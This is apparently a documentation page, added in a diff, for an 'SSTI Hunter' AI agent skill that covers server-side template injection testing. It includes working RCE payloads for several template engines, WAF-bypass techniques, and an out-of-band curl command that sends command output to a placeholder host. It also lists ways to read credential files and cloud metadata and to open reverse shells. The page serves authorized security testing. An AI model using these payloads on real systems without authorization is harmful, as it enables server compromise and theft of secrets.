@@ -1,0 +1,140 @@
+---
+title: SSTI Hunter
+description: Complete SSTI detection and exploitation methodology — engine fingerprinting, RCE payloads per engine, sandbox escapes, blind detection, and report structure.
+---
+
+<Info>
+  **Category:** Pentest & security testing
+</Info>
+
+**Installation**
+
+```bash
+auditguard-skills add ssti-hunter
+```
+
+---
+
+## Summary
+
+Execute a complete Server-Side Template Injection (SSTI) methodology — from finding injection points to confirming RCE and producing a structured report.
+
+- Covers 13 template engines: Jinja2, Twig, Smarty, Mako, FreeMarker, Velocity, Pebble, Thymeleaf, ERB, EJS, Pug, Handlebars, and Nunjucks
+- Phase 1–3 map injection surfaces, confirm vulnerability, and fingerprint the engine using a decision tree
+- Phase 4 provides RCE payloads per engine, Phase 5 covers bypass techniques (string concatenation, encoding, WAF evasion), Phase 6 handles blind SSTI (time-based and OOB)
+- Phase 7 escalates impact (sensitive file read, cloud metadata, reverse shell) and Phase 9 produces a structured report with CWE, reproduction steps, and remediation guidance
+
+---
+
+## SKILL.md
+
+### SSTI Hunter
+
+Complete SSTI detection and exploitation methodology — engine fingerprinting, RCE payloads per engine, sandbox escapes, blind detection, and report structure.
+
+#### When to Use This Skill
+
+Use this skill when the user:
+
+- Asks to test for SSTI, server-side template injection, or template injection
+- Identifies a parameter that reflects input and suspects it may be evaluated server-side
+- Sees `{{7*7}}`, `${7*7}`, or `<%= 7*7 %>` return `49` in a response
+- Gets a stack trace mentioning Jinja2, Twig, FreeMarker, Velocity, Mako, ERB, EJS, Pebble, Thymeleaf, Smarty, Pug, Handlebars, or Nunjucks
+- Wants to escalate an SSTI to RCE, file read, or credential theft
+- Needs to fingerprint which template engine is running
+- Is writing an SSTI finding and needs severity, CWE, or remediation guidance
+
+#### What Does It Check?
+
+SSTI occurs when user input is embedded directly into a template and evaluated by the engine. The result is almost always Remote Code Execution on the server. The skill maps injection surfaces, confirms evaluation, fingerprints the engine, and provides targeted RCE payloads.
+
+**In scope:**
+- All major template engines across Python, PHP, Java, Ruby, and JavaScript
+- Reflected, stored, and blind SSTI (time-based and OOB)
+- Sandbox escape techniques for hardened engines (Jinja2 SandboxedEnvironment, Twig sandbox)
+- Impact escalation: sensitive file read, cloud metadata (AWS/GCP/Azure), reverse shell
+
+**Out of scope:**
+- Client-side template injection (AngularJS, Vue) — different vulnerability class
+- Automated scanning — this is a guided methodology
+
+#### How It Works
+
+**Phase 1: Find Injection Points**
+
+Map all reflection surfaces: URL query parameters, path segments, HTTP headers (User-Agent, Referer), form inputs, cookies, file names, email templates, and profile fields. Confirm reflection with a canary string before probing.
+
+**Phase 2: Detect Vulnerability**
+
+Send math expression probes (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`). An evaluated result (e.g. `49`) confirms SSTI. A 500 error with a stack trace also indicates injection and often names the engine.
+
+**Phase 3: Fingerprint the Engine**
+
+Use the decision tree: `{{7*7}}` → `{{7*'7'}}` to distinguish Jinja2 from Twig; `${7*7}` with Java stack trace to identify FreeMarker vs Velocity vs Pebble; `<%= 7*7 %>` for ERB (Ruby) vs EJS (Node). Each engine has distinct delimiter behavior.
+
+**Phase 4: Exploit per Engine**
+
+Targeted RCE payloads for each engine:
+- **Jinja2:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+- **Twig:** `{{["id"]|map("system")|join}}`
+- **FreeMarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+- **Velocity:** `#set($runtime=$class.forName("java.lang.Runtime").getRuntime())`
+- **Thymeleaf:** `*{T(java.lang.Runtime).getRuntime().exec('id')}`
+- **ERB:** `<%= \`id\` %>`
+- And more for all 13 engines.
+
+**Phase 5: Bypass Techniques**
+
+String concatenation to split blocked keywords, URL/HTML encoding bypasses, hex-encoded attribute access (Jinja2), and comment injection to break WAF detection of `{{`.
+
+**Phase 6: Blind SSTI**
+
+Time-based confirmation (`sleep 5`) and OOB via Burp Collaborator or interactsh (`curl http://OOB.URL/?x=$(id|base64)`).
+
+**Phase 7: Escalate Impact**
+
+Read sensitive files (`/etc/passwd`, `/proc/self/environ`, `.env`, SSH private keys), query cloud metadata endpoints (AWS/GCP/Azure), or establish a reverse shell.
+
+**Phase 8: Confirm the Finding**
+
+Checklist: math expression evaluated server-side, engine identified, RCE payload returned `id`/`whoami` output (or blind confirmed), reproducible in a fresh session.
+
+#### Output
+
+| Phase | Result |
+|-------|--------|
+| Phase 2 | Confirmed SSTI / not injectable / 500 error (likely injectable) |
+| Phase 3 | Engine identified from decision tree |
+| Phase 4 | RCE payload returns command output |
+| Phase 6 | Blind confirmed via time delay or OOB callback |
+
+Report structure follows: `Title: SSTI in [parameter] on [endpoint] — RCE via [Engine]`, Severity: Critical, CWE-94, OWASP A03:2021.
+
+#### Known Limitations
+
+- Blind SSTI OOB requires an internet-accessible interactsh or Burp Collaborator server
+- Thymeleaf SSTI usually appears in Spring MVC path variables — requires understanding of the routing layer
+- Handlebars RCE requires prototype pollution (< 4.7.7) — patched versions may not be exploitable
+- Always confirm scope before use — RCE payloads are high-impact
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+  <Card title="xss-hunter" href="/skills/xss-hunter">
+    Complete XSS testing methodology — reflected, stored, DOM, blind, CSP bypass, WAF evasion
+
+    `your-org/auditguard`
+  </Card>
+  <Card title="check-exploit" href="/skills/check-exploit">
+    Search known exploit databases for a given service, version, or CVE
+
+    `your-org/auditguard`
+  </Card>
+  <Card title="finding-writer" href="/skills/finding-writer">
+    Convert raw pentest notes into structured audit findings ready for reporting
+
+    `your-org/auditguard`
+  </Card>
+</CardGroup>
